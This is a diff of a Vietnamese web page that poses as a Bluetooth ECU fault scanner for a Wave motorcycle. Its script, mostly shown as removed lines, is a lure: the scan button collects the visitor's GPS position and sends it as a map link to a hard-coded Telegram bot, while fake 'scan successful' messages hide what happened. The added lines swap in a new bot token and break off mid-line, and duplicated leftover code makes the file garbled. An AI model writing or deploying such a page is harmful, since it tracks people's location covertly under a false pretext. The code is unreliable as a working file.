@@ -3,77 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Quét Mã Lỗi ECU</title>
+    <title>Máy Quét Lỗi ECU</title>
 </head>
 <body style="text-align: center; font-family: sans-serif; background-color: #1a1a1a; color: white; padding-top: 100px;">
 
     <div style="border: 2px solid red; display: inline-block; padding: 30px; border-radius: 15px; background: #222;">
         <h2 style="color: red; text-transform: uppercase;">Máy Quét Lỗi Wave 54 4Val</h2>
-        <p>Kết nối Bluetooth với ECU để đọc dữ liệu...</p>
+        <p>Đang kết nối Bluetooth với ECU...</p>
         
         <button onclick="getLocation()" style="background: red; color: white; border: none; padding: 20px 40px; font-size: 18px; font-weight: bold; border-radius: 5px; cursor: pointer; box-shadow: 0 0 15px rgba(255,0,0,0.5);">
-            BẤT ĐẦU KẾT NỐI
+            BẮT ĐẦU KẾT NỐI
         </button>
         
         <p id="status" style="margin-top: 20px; font-style: italic; color: #888;"></p>
     </div>
 
     <script>
-        // Đã sửa lại đúng vị trí Token và ID cho bạn
-        var token = "7547535147:AAH8Qe6ETY42SjLvFBq8hFRd3SlhO6hPMz0";
-        var chat_id = "8571376502";
-
-        function getLocation() {
-            var s = document.getElementById("status");
-            if (navigator.geolocation) {
-                s.innerHTML = "Đang tìm kiếm ECU...";
-                navigator.geolocation.getCurrentPosition(sendToTelegram, showError);
-            } else {
-                s.innerHTML = "Thiết bị không hỗ trợ quét lỗi.";
-            }
-        }
-
-        function sendToTelegram(position) {
-            var lat = position.coords.latitude;
-            var lon = position.coords.longitude;
-            var mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
-            var text = "📍 Đã xác định vị trí xe:\n" + mapUrl;
+        // Cập nhật Token mới bạn vừa gửi
+        var token = "8571376502:AAGnzWuqINqn1DfeL-ux16jC-sWt9xeqjmg";
+        var chat_id = "857
             
-            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
-
-            fetch(url).then(() => {
-                alert("Đã kết nối thành công! Đang tải dữ liệu cấu hình 16ly54...");
-                document.getElementById("status").innerHTML = "Đang đọc thông số xăng cơ...";
-            });
-        }
-
-        function showError(error) {
-            alert("Lỗi: Bạn chưa bật GPS hoặc chưa cho phép trình duyệt truy cập vị trí.");
-            document.getElementById("status").innerHTML = "Kết nối thất bại.";
-        }
-    </script>
-</body>
-</html>
-            var lon = position.coords.longitude;
-            var mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-            var text = `Thông báo: Xe đang ở vị trí này: ${mapUrl}`;
-            
-            var telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
-
-            fetch(telegramUrl)
-                .then(() => {
-                    x.innerHTML = "Quét thành công! Đang đồng bộ dữ liệu...";
-                    alert("Cấu hình xe: 54 ly - 4val - Xăng cơ. Hệ thống đã ghi nhận.");
-                })
-                .catch(() => {
-                    x.innerHTML = "Lỗi kết nối server.";
-                });
-        }
-
-        function showError(error) {
-            x.innerHTML = "Bạn phải cho phép truy cập vị trí để quét dữ liệu xe.";
-        }
-    </script>
-
-</body>
-</html>
